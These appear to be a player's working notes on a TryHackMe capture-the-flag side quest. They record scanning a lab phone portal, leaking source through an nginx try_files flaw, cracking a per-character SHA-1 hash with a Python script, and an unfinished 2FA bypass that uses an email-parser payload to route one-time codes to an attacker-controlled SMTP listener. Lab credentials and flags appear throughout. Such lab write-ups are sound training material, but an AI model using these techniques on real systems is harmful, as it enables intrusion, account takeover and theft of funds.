2026-01-18 19:52:00 EST -- START TIME
# BreachBlocker Unlocker
--------------------------------------

|================================================================
- Name: 
- IP Address: 10.66.129.33
- OS: 
- Notes: 

//CREDS:
	PHONE_PASSCODE = "210701"
	HOPFLIX:
		sbreachblocker@easterbunnies.thm | malharerocks

//Flags:
	THM{eggsposed_source_code}
	THM{fluffier_things_season_4}

|================================================================
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// Finding the Key
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
In the Advent of Cyber Day 21 room, we are given a ZIP file and its password.

Downloading the archive and extracting it with the provided password, we find an HTA file inside.

wget -q https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip

//Password: CanYouREM3?

//Used AI to Solve:
throne123*

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


## Introduction
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
### Hopper the Detective
//When Sir BreachBlocker is captured, Hopper senses an opportunity: the last key to the stolen AoC charity funds is hidden somewhere on Sir BreachBlocker’s seized phone.

//The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.

ip=10.66.129.33

//This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.

Visit: firefox-esr http://$ip:21337/
Memory Key: throne123*

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// nmap --
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// SCAN
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)

echo $ports
//22,25,8443,21337

sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 39:1f:42:56:2e:b6:16:d0:a3:a3:94:18:54:4b:39:39 (ECDSA)
|_  256 b4:c9:9c:3b:78:e1:5a:d5:cc:00:86:8c:67:1e:d5:25 (ED25519)
25/tcp    open  smtp     Postfix smtpd
| smtp-commands: hostname, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ 2.0.0 Commands: AUTH BDAT DATA EHLO ETRN HELO HELP MAIL NOOP QUIT RCPT RSET STARTTLS VRFY XCLIENT XFORWARD
8443/tcp  open  ssl/http nginx 1.29.3
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.29.3
|_http-title: Mobile Portal
| tls-alpn: 
|   h2
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2025-12-11T05:00:31
|_Not valid after:  2026-12-11T05:00:31
21337/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Unlock Hopper's Memories


# UDP scan
sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap

PORT   STATE         SERVICE
68/udp open|filtered dhcpc

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// 8443/tcp	ssl/http nginx 1.29.3
//https://$ip:8443/
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

//This is a phone landing page, there is a mobile portal with a few apps installed.

//Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.


-- feroxbuster --
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

feroxbuster -k -u https://$ip:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out

200  https://10.65.166.164:8443/main.js
200  https://10.65.166.164:8443/selfie.png
200  https://10.65.166.164:8443/breaky.png
200  https://10.65.166.164:8443/wallpaper.png
200  https://10.65.166.164:8443/
200  https://10.65.166.164:8443/index.html
401  https://10.65.166.164:8443/api/get-last-viewed
200  https://10.65.166.164:8443/hopflix-874297.db
200  https://10.65.166.164:8443/main.py
200  https://10.65.166.164:8443/requirements.txt


feroxbuster -k -u https://$ip:8443/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --scan-limit 2 -o feroxbuster_8443_quickhits.out

200  https://10.65.166.164:8443/breaky.png
200  https://10.65.166.164:8443/main.js
200  https://10.65.166.164:8443/wallpaper.png
200  https://10.65.166.164:8443/selfie.png
200  https://10.65.166.164:8443/
200  https://10.65.166.164:8443/nginx.conf

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//Grab WebFiles
curl -k https://10.65.166.164:8443/main.js -o main.js
curl -k https://10.65.166.164:8443/index.html -o index.html
curl -k https://10.65.166.164:8443/requirements.txt -o requirements.txt
curl -k https://10.65.166.164:8443/nginx.conf -o nginx.conf
curl -k https://10.65.166.164:8443/main.py -o main.py

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


//I need an account number and a pin to sign into the banking app, so let’s enumerate the phone some more.

//The email field in Hopflix is prefilled which grants Sir BreachBlocker’s email. Checking the inbox discloses that the charity funds are locked.


//HOPFLIX
sbreachblocker@easterbunnies.thm


//There are some interesting text messages to say the least but the only other thing of note was an option to disable the face id on the authenticator, however that requires a 6 digit passcode.

//A bit more digging and I found a phone passcode hardcoded in main.js

const PHONE_PASSCODE = "210701"

//I turned off the authenticator face id so I don’t have issues in the future.


// First Flag
//What's the CODE_FLAG?
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//There is not much to get from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with quickhits.txt, I discover the nginx.conf file.

ffuf -k -u "https://10.64.142.189:8443/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 100 -mc all -ic -fc 404

//NOTE:
-mc all
	Match all HTTP status codes

-ic
	Ignore wordlist case

-fc 404
	Filter out HTTP 404 responses
	Removes “Not Found” noise

//Lets read the Nginx configuration directly.

curl -k https://$ip:8443/nginx.conf -o nginx.conf

// nginx.conf
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
user  nginx;
worker_processes 4;
error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;
events {
    worker_connections 2048;
}
http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';
    access_log  /var/log/nginx/access.log  main;
    sendfile        on;
    keepalive_timeout  300;
    server {
        listen 443 ssl http2;
        ssl_certificate /app/server.cert;
        ssl_certificate_key /app/server.key;
        ssl_protocols TLSv1.2;
        location / {
            try_files $uri @app;
        }
        location @app {
            include uwsgi_params;
            uwsgi_pass unix:///tmp/uwsgi.sock;
        }
    }
}
daemon off;

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//One directive immediately stands out: try_files. This tells Nginx to first check whether the requested URI exists as a file on disk and serve it directly. Only if the file does not exist is the request forwarded to the uWSGI backend.

//Interesting code above:
	location / {
    	try_files $uri @app;
	}

//We can abuse this behavior to read files from the web application directory, including source code. Since we know this is a Python application, we try common filenames such as app.py and hello.py. This succeeds with main.py, allowing us to leak the application source code and capture the first flag.


//THM{eggsposed_source_code}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// Second Flag
//What's the HOPFLIX_FLAG?
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.

curl -k https://$ip:8443/hopflix-874297.db -o hopflix-874297.db
//Got it

curl -k https://$ip:8443/hopsecbank-12312497.db
//Nothing

file hopflix-874297.db
hopflix-874297.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

sqlite3 hopflix-874297.db

//List all Tables
sqlite> .tables
users

//Dumping the database reveals a suspiciously long hash for the user sbreachblocker@easterbunnies.thm.

//Dump Database
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (email text, full_name text, password_hash text);
INSERT INTO users VALUES('sbreachblocker@easterbunnies.thm','Sir BreachBlocker','03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a');
COMMIT;

//Make note:
echo '03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a' > sbreachblocker.hash

//The Hopflix authentication system implements a non-standard password hashing scheme where each password character is hashed independently using repeated SHA-1, then concatenated. This design allows the password to be recovered character-by-character offline using the database dump and application source code.

//Inspecting the login logic shows that the password hash is constructed by taking each character of the password, hashing it with SHA-1 for 5000 iterations, and then concatenating the results.

// flag2_solve.py
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
import hashlib
import string

HASH_HEX = "03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a"

ITERATIONS = 1000  # <-- IMPORTANT: this hash file matches 1000, not 5000
CHUNK_SIZE = 40

def chain_sha1(s: str, n: int) -> str:
    res = s
    for _ in range(n):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

chunks = [HASH_HEX[i:i+CHUNK_SIZE] for i in range(0, len(HASH_HEX), CHUNK_SIZE)]

# Build rainbow table for printable ASCII
alphabet = ''.join(chr(i) for i in range(32, 127))  # space..~
lookup = {chain_sha1(ch, ITERATIONS): ch for ch in alphabet}

password = ''.join(lookup.get(c, '?') for c in chunks)
print(password)

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//WebSite
	https://$ip:8443/

//Creds
	sbreachblocker@easterbunnies.thm | malharerocks


//THM{fluffier_things_season_4}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// Third Flag
//What's the BANK_FLAG?
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
# RoadMap: (OTP email → 2FA → release)

#What we know:
- Bank account ID: 'sbreachblocker@easterbunnies.thm'
- Bank PIN: 'malharerocks' 

- If PIN is correct, server returns trusted_emails or trusted_domains for OTP routing
- OTP is emailed (SMTP) and then verified by /api/verify-2fa
- After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}


//Adding hosts entry to be safe.
-- Add /etc/hosts file entries --
echo -e "$ip \t easterbunnies.thm" | sudo tee -a /etc/hosts
cat /etc/hosts


//Looking back at the code used to generate such code shows that it is truly random.

// excerpt from main.py
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

...
@app.route('/api/send-2fa', methods=['POST'])
def send_2fa():
    data = request.json
    otp_email = str(data.get('otp_email', ''))

    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403

    # Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    code = str(data.get('code', ''))

    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403

    if not session.get('bank_2fa_code', False):
        return jsonify({'error': 'No 2FA code generated'}), 404

    if code == decrypt(session.get('bank_2fa_code')):
        session['bank_2fa_verified'] = True
        return jsonify({'success': True})
    else:
        if 'bank_2fa_code' in session:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401
...

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//However the logic behind how the application handles emails is deeply flawed. It does a few checks to make sure the email address is valid, the correct structure, and is in the allowed emails/domains lists.

// excerpt from main.py
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

...
def send_otp_email(otp, to_addr):
    if not validate_email(to_addr):
        return -1
                
    allowed_emails= session['bank_allowed_emails']
    allowed_domains= session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1
                
    from_addr = 'no-reply@hopsecbank.thm'
    message = f"""\
    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is {otp}.
    
    Thanks for trusting Hopsec Bank!"""

    s = smtplib.SMTP('smtp')
    s.sendmail(from_addr, to_addr, message)
    s.quit()
...

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


//The real problem here is this line:

if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1

//This doesn’t ensure that both the domain and email address are valid. Due to how it extracts the domain from the email address, I am able to alter the email so that it matches to an allowed domain but is directed towards my IP.

//By ensuring the email ends with @easterbunnies.thm, the check domain not in allowed_domains always evaluates to False which allows the function to continue, regardless of the actual destination address.

//There is a known vulnerability within SMTP and it allows for us to comment out a part of our email address. Check the link to go deeper on exploiting email parsers to bypass these types of checks.
https://portswigger.net/research/splitting-the-email-atom

//We’ll need to host an SMTP server in order to receive the one time pass. Since Kali Linux doesn’t come default with one, lets use a tool called aiosmtpd.

//Install
sudo apt install python3-aiosmtpd

//Start Listener
aiosmtpd -n -l 192.168.135.149:25

//This can capture a POST request to the /api/send2fa endpoint if we change the email field to the payload.


//The payload should look something like:
attacker@[ATTACKING_IP](@easterbunnies.thm

//I am trying:
gh05t@[192.168.135.149](@easterbunnies.thm

FIGURE THIS OUT....I AM Tired


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



